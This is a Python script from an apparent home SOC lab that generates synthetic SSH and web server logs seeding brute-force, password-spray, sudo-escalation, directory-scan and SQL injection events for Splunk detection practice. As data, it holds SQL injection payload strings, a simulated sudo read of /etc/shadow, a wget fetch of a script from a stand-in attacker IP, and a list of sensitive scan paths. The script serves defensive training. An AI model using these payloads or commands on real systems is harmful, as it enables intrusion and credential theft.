#!/usr/bin/env python3
"""
Home SOC Lab - log generator

Writes realistic Linux SSH auth logs and web server access logs to ./logs/,
mixing normal day-to-day activity with a handful of attack scenarios so the
Splunk detections in this repo have something real to catch.

Scenarios included:
  1. SSH brute force           (MITRE T1110.001 - Password Guessing)
  2. Successful login after brute force (T1078 - Valid Accounts)
  3. Password spraying         (T1110.003 - Password Spraying)
  4. Privilege escalation via sudo by an unusual user (T1548.003)
  5. Web directory scanning    (T1595.003 - Wordlist Scanning)
  6. SQL injection attempts    (T1190 - Exploit Public-Facing Application)

Usage:
  python3 generate_logs.py                 # one batch of ~2,000 events
  python3 generate_logs.py --live          # then keep writing normal traffic
  python3 generate_logs.py --attack-now    # replay the attacks right now (alerts fire)
"""

import argparse
import os
import random
import time
from datetime import datetime, timedelta

HOSTNAME = "soc-lab-web01"
LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "logs")
AUTH_LOG = os.path.join(LOG_DIR, "auth.log")
WEB_LOG = os.path.join(LOG_DIR, "access.log")

LEGIT_USERS = ["vijaya", "admin", "deploy", "backup", "analyst"]
LEGIT_IPS = ["192.168.1.10", "192.168.1.15", "192.168.1.22", "10.0.0.5"]

# Documentation / test ranges (RFC 5737) so no real addresses are used
ATTACKER_IPS = ["203.0.113.45", "198.51.100.23", "203.0.113.99"]
SPRAY_USERS = ["root", "test", "oracle", "postgres", "ubuntu", "guest",
               "ftpuser", "support", "user1", "jenkins", "git", "mysql"]

WEB_PAGES = ["/", "/index.html", "/about", "/contact", "/products",
             "/login", "/static/css/main.css", "/static/js/app.js", "/favicon.ico"]
USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) Mobile/15E148",
]
SCAN_PATHS = ["/admin", "/wp-admin", "/wp-login.php", "/.env", "/.git/config",
              "/phpmyadmin", "/backup.zip", "/config.php", "/server-status",
              "/api/v1/users", "/console", "/cgi-bin/test.cgi", "/db.sql",
              "/.htaccess", "/old", "/test", "/debug", "/shell.php"]
SQLI_PAYLOADS = ["id=1'%20OR%20'1'='1", "id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                 "q=%27%3B%20DROP%20TABLE%20users--", "id=1%20AND%20SLEEP(5)",
                 "user=admin'--"]


def syslog_ts(dt):
    # syslog pads single-digit days with a space, e.g. "Oct  4 09:12:01"
    return f"{dt:%b} {dt.day:>2} {dt:%H:%M:%S}"


def apache_ts(dt):
    # include the real local UTC offset so Splunk places events at the right time
    return dt.astimezone().strftime("%d/%b/%Y:%H:%M:%S %z")


def pid():
    return random.randint(1000, 65000)


# ---------- auth.log events ----------

def ssh_success(dt, user, ip):
    return f"{syslog_ts(dt)} {HOSTNAME} sshd[{pid()}]: Accepted password for {user} from {ip} port {random.randint(40000, 65000)} ssh2"


def ssh_fail(dt, user, ip, invalid=False):
    prefix = "invalid user " if invalid else ""
    return f"{syslog_ts(dt)} {HOSTNAME} sshd[{pid()}]: Failed password for {prefix}{user} from {ip} port {random.randint(40000, 65000)} ssh2"


def sudo_cmd(dt, user, cmd):
    return f"{syslog_ts(dt)} {HOSTNAME} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"


# ---------- access.log events ----------

def web_hit(dt, ip, path, status, ua=None, size=None):
    ua = ua or random.choice(USER_AGENTS)
    size = size if size is not None else random.randint(200, 15000)
    return f'{ip} - - [{apache_ts(dt)}] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def normal_activity(start, count):
    """Everyday traffic: real users logging in, admins using sudo, website visitors."""
    auth, web = [], []
    t = start
    for _ in range(count):
        t += timedelta(seconds=random.randint(1, 6))
        roll = random.random()
        if roll < 0.08:
            auth.append((t, ssh_success(t, random.choice(LEGIT_USERS), random.choice(LEGIT_IPS))))
        elif roll < 0.10:
            # the odd typo'd password from a real user
            auth.append((t, ssh_fail(t, random.choice(LEGIT_USERS), random.choice(LEGIT_IPS))))
        elif roll < 0.12:
            auth.append((t, sudo_cmd(t, "admin", random.choice(["/usr/bin/apt update", "/bin/systemctl restart nginx"]))))
        else:
            web.append((t, web_hit(t, random.choice(LEGIT_IPS + ["81.2.69.142", "86.12.34.56"]),
                                   random.choice(WEB_PAGES), random.choice([200] * 18 + [304, 404]))))
    return auth, web


def attack_activity(attack_start):
    """The six attack scenarios, starting at attack_start."""
    auth, web = [], []

    # 1 + 2. Brute force against 'admin', then a success from the same IP
    a = attack_start
    bf_ip = ATTACKER_IPS[0]
    for _ in range(45):
        a += timedelta(seconds=random.randint(1, 3))
        auth.append((a, ssh_fail(a, "admin", bf_ip)))
    a += timedelta(seconds=2)
    auth.append((a, ssh_success(a, "admin", bf_ip)))

    # 4. Sudo from an account that never normally uses it, right after the compromise
    a += timedelta(seconds=40)
    auth.append((a, sudo_cmd(a, "backup", "/bin/cat /etc/shadow")))
    a += timedelta(seconds=15)
    auth.append((a, sudo_cmd(a, "backup", "/usr/bin/wget http://203.0.113.45/x.sh -O /tmp/x.sh")))

    # 3. Password spray: many usernames, few tries each, from one IP
    s = attack_start + timedelta(minutes=2)
    for user in SPRAY_USERS:
        s += timedelta(seconds=random.randint(5, 15))
        auth.append((s, ssh_fail(s, user, ATTACKER_IPS[1], invalid=True)))

    # 5. Directory scanning
    w = attack_start + timedelta(minutes=1)
    scanner_ua = "gobuster/3.6"
    for path in SCAN_PATHS * 3:
        w += timedelta(milliseconds=random.randint(100, 600))
        web.append((w, web_hit(w, ATTACKER_IPS[2], path, random.choice([404, 404, 404, 403]), scanner_ua, 0)))

    # 6. SQL injection attempts
    w += timedelta(minutes=1)
    for payload in SQLI_PAYLOADS:
        w += timedelta(seconds=random.randint(2, 8))
        web.append((w, web_hit(w, ATTACKER_IPS[2], f"/products?{payload}", random.choice([200, 500]), "sqlmap/1.8")))

    return auth, web


def build_batch(start, normal_count=1500, attack_at=None):
    auth, web = normal_activity(start, normal_count)
    if attack_at is not None:
        a_auth, a_web = attack_activity(attack_at)
        auth += a_auth
        web += a_web
    auth.sort(key=lambda x: x[0])
    web.sort(key=lambda x: x[0])
    return [line for _, line in auth], [line for _, line in web]


def write(lines, path):
    with open(path, "a", encoding="utf-8") as f:
        for line in lines:
            f.write(line + "\n")


def main():
    parser = argparse.ArgumentParser(description="Generate SOC lab logs")
    parser.add_argument("--live", action="store_true",
                        help="keep writing normal traffic every 30 seconds")
    parser.add_argument("--attack-now", action="store_true",
                        help="write the attack scenarios with current timestamps so scheduled alerts fire")
    args = parser.parse_args()

    os.makedirs(LOG_DIR, exist_ok=True)

    if args.attack_now:
        # Start 6 minutes ago so every event is in the past and inside a 15-minute detection window
        now = datetime.now()
        auth, web = build_batch(now - timedelta(minutes=6), normal_count=50, attack_at=now - timedelta(minutes=6))
        write(auth, AUTH_LOG)
        write(web, WEB_LOG)
        print(f"Attack scenarios written with current timestamps ({len(auth)} auth, {len(web)} web events).")
        print("Wait for the next 5-minute alert run, then check Activity > Triggered Alerts in Splunk.")
        return

    # Two hours of history with the attacks somewhere in the middle
    start = datetime.now() - timedelta(hours=2)
    auth, web = build_batch(start, attack_at=start + timedelta(minutes=random.randint(20, 60)))
    write(auth, AUTH_LOG)
    write(web, WEB_LOG)
    print(f"Wrote {len(auth)} auth events -> {os.path.abspath(AUTH_LOG)}")
    print(f"Wrote {len(web)} web events  -> {os.path.abspath(WEB_LOG)}")

    if args.live:
        print("Live mode: writing normal traffic every 30 seconds (Ctrl+C to stop)")
        try:
            while True:
                time.sleep(30)
                auth, web = build_batch(datetime.now() - timedelta(seconds=30), normal_count=10)
                write(auth, AUTH_LOG)
                write(web, WEB_LOG)
                print(f"{datetime.now():%H:%M:%S} wrote {len(auth) + len(web)} events")
        except KeyboardInterrupt:
            print("Stopped.")


if __name__ == "__main__":
    main()
